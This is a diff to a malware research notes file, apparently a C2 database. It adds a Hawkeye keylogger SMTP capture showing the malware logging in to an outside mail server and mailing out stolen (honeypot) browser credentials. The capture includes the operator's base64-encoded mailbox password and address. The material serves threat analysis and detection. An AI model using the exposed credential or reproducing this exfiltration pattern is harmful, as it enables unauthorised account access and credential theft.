@@ -36,6 +36,45 @@ el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 3583.61 MB<br>IP: 18=
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-submission.png "AgentTesla Submission")
 
+#### Hawkeye keyogger
+~~~
+220 and/or bulk e-mail.
+EHLO User-PC
+250-europa.websitewelcome.com Hello User-PC [89.187.165.47]
+250-SIZE 52428800
+250-8BITMIME
+250-PIPELINING
+250-AUTH PLAIN LOGIN
+250-STARTTLS
+250 HELP
+AUTH login 
+334 UGFzc3dvcmQ6
+I01vc2hhcnJvZiMzMjFA
+235 Authentication succeeded
+MAIL FROM:<mosharrof@mhcapparels.com>
+250 OK
+RCPT TO:<mosharrof@mhcapparels.com>
+250 Accepted
+DATA
+354 Enter message, ending with "." on a line by itself
+MIME-Version: 1.0
+From: mosharrof@mhcapparels.com
+To: mosharrof@mhcapparels.com
+Date: 9 Oct 2019 01:57:35 +0100
+Subject: HawkEye Keylogger - Reborn v9 - Passwords Logs - admin \ USER-PC -
+ 89.187.165.47
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: base64
+
+SGF3a0V5ZSBLZXlsb2dnZXIgLSBSZWJvcm4gdjkNClBhc3N3b3JkcyBMb2dzDQphZG1p
+biBcIFVTRVItUEMNCg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT0NClVSTCAgICAgICAgICAgICAgIDogaHR0cHM6Ly9tLmZhY2Vi
+b29rLmNvbQ0KV2ViIEJyb3dzZXIgICAgICAgOiBGaXJlZm94IDMyKw0KVXNlciBOYW1l
+ICAgICAgICAgOiBob25leUBwb3QuY29tDQpQYXNzd29yZCAgICAgICAgICA6IGhvbmV5
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/hawkeye.png "Hawkeye")
+
+
 #### Lokibot
 
 follw tcp stream, not http stream in wireshark
